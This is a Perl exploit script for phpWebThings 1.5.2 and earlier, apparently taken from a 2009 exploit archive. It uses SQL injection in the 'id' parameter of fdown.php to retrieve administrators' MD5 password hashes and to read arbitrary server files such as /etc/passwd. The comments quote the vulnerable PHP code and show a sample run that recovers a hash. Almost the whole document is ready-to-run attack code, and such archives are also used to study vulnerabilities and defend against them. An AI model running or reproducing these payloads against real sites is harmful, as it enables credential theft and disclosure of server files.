#!/usr/bin/perl
                                                                                     
################################################################################################### 
# phpWebThings <= 1.5.2 MD5 Hash Retrieve / File Disclosure Remote Exploit                        # 
#                                                                                                 # 
# by staker                                                                                       # 
# ------------------------------                                                                  # 
# mail: staker[at]hotmail[dot]it                                                                  # 
# url: http://phpwebthings.nl                                                                     # 
# ------------------------------                                                                  #
#                                                                                                 #                        
# NOTE:                                                                                           #
# 1. it works regardless of php.ini settings                                                      #
# 2. wt_config.php contains mysql login                                                           #
#                                                                                                 #
# short explanation:                                                                              #
# ----------------------------------------------------                                            #
# phpWebThings contains a flaw that allows an attacker                                            #
# to carry out an SQL injection attack. The issue is                                              #
# due to the fdown.php script not properly sanitizing                                             #
# user-supplied input to the 'id' variable. This may                                              #
# allow an attacker to inject or manipulate                                                       #
# SQL queries in the backend database (php.ini indep)                                             #
# ----------------------------------------------------                                            #
#                                                                                                 #
# [file: fdown.php]                                                                               #
# ------------------------------------                                                            #
#                                                                                                 #
# <?php                                                                                           #
# include_once("core/main.php");                                                                  #
#                                                                                                 #
# $ret = db_query("select file from {$config["prefix"]}_forum_msgs where cod={$_REQUEST["id"]}"); #
# $row = db_fetch_array($ret);                                                                    #
# header('HTTP/1.1 200 OK');                                                                      #
# header('Date: ' . date("D M j G:i:s T Y"));                                                     #
# header('Last-Modified: ' . date("D M j G:i:s T Y"));                                            #
# header("Content-Type: application/force-download");                                             #
# header("Content-Lenght: " . (string)(filesize("var/forumfiles/{$row["file"]}")));               #
# header("Content-Transfer-Encoding: Binary");                                                    #
# header("Content-Disposition: attachment; filename={$row["file"]}");                             #
# readfile("var/forumfiles/{$row["file"]}");                                                      #
#                                                                                                 #
# ?>                                                                                              #
#                                                                                                 #
# -------------------------------------                                                           #
#                                                                                                 #
# yeat@snippet:~/Desktop$ perl a.pl localhost/cms -c 1                                            #
# [*--------------------------------------------------------------------*]                        #
# [* phpWebThings <= 1.5.2 MD5 Hash Retrieve / File Disclosure Exploit  *]                        #
# [*--------------------------------------------------------------------*]                        #
# [* Usage: perl web.pl [target + path] [OPTIONS]                       *]                        #
# [*                                                                    *]                        #
# [* Options:                                                           *]                        #
# [* [files] -d ../../../../../../etc/passwd                            *]                        #
# [* [hash.] -c user_id                                                 *]                        #
# [* [table] -t set a table prefix (default: wt)                        *]                        #
# [*--------------------------------------------------------------------*]                        #
# [* MD5 Hash: f2c79ad3d1f03ba266dc0a85e1266671                                                   #
#                                                                                                 #
# ----------------------------------------------------------                                      #
# Today is: 12 June 2009                                                                          #
# Location: Italy,Turin.                                                                          #  
# http://www.youtube.com/watch?v=E78BGajeuAI&feature=related                                      #
# ----------------------------------------------------------                                      #
###################################################################################################

use LWP::UserAgent;
use Getopt::Long;

&phpWebThings::init;

my ($files,$admin,$ua_lib,$domain,$table);

$domain  = $ARGV[0] || exit(0);


$ua_lib = LWP::UserAgent->new(
                               timeout      => 5,
                               max_redirect => 0,
                               agent        => 'Mozilla/4.0 (compatible; Lotus-Notes/5.0; Windows-NT)',
                             ) || die $!;  

GetOptions(
           'p=s' => \$proxy,
           'd=s' => \$files,
           'c=i' => \$admin,
           't=s' => \$table,
         );
         

die(&phpWebThings::Exploit);
  

sub phpWebThings::Exploit()
{
       return Disclose::File($files) if defined $files;
       return Retrieve::Hash($admin) if defined $admin;
}       
               
       
sub Disclose::File
{
      my $filename = $_[0] || die $!;
      
      my $keywords = "\x2F\x66\x64\x6F\x77\x6E\x2E\x70\x68\x70";
      
      my $response = $ua_lib->post(parse::URL($domain.$keywords),
                     [ id => "1/**/union/**/select/**/0x".Hex::convert($filename)."#" ]);
      
      if ($response->status_line =~ /^(302|200|301)/) {
            return $response->content;
      }
      else {
            return $response->as_string;
      }            
}
       
sub Retrieve::Hash()
{
       my $user_id = $_[0] || die $!;
        
       my $keywords = "\x2F\x66\x64\x6F\x77\x6E\x2E\x70\x68\x70"; 
       
       my $prefix = (defined $table) ? $table : 'wt';
            
       my $response = $ua_lib->post(parse::URL($domain.$keywords),
                     [ id => "1 UNION SELECT password FROM ${prefix}_users WHERE uid=$user_id#" ]);     
      
      if ($response->status_line =~ /^(302|200|301)/) 
      {
            if ($response->content =~ /([0-9a-f]{32})/) {
                  return "[* MD5 Hash: $1\n";
            }         
      }
      else {
            return $response->as_string;
      }                           
} 
          

sub Hex::convert()
{
       my $string = shift @_ || die $!;
       
       return unpack("H*",$string);
}       
         
      
sub parse::URL()
{
        my $string = shift @_ || die($!);
        
        if ($string !~ /^http:\/\/?/i) {
                $string = 'http://'.$string;
        }
        
        return $string;

}



sub phpWebThings::init
{
       print  "[*--------------------------------------------------------------------*]\n".
              "[* phpWebThings <= 1.5.2 MD5 Hash Retrieve / File Disclosure Exploit  *]\n".
              "[*--------------------------------------------------------------------*]\n". 
              "[* Usage: perl web.pl [target + path] [OPTIONS]                       *]\n".
              "[*                                                                    *]\n".
              "[* Options:                                                           *]\n".
              "[* [files] -d ../../../../../../etc/passwd                            *]\n".
              "[* [hash.] -c user_id                                                 *]\n".
              "[* [table] -t set a table prefix (default: wt)                        *]\n".
              "[*--------------------------------------------------------------------*]\n";
}   

# milw0rm.com [2009-06-12]
